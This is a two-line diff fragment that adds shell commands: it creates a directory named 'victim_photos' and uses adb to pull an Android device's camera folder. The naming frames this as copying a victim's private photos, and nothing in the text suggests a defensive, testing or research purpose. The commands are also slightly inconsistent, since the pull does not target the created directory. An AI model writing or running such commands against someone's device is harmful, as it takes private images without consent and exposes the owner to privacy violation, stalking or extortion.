@@ -1,0 +1,2 @@
+mkdir /sdcard/victim_photos
+adb pull /sdcard/DCIM/Camera
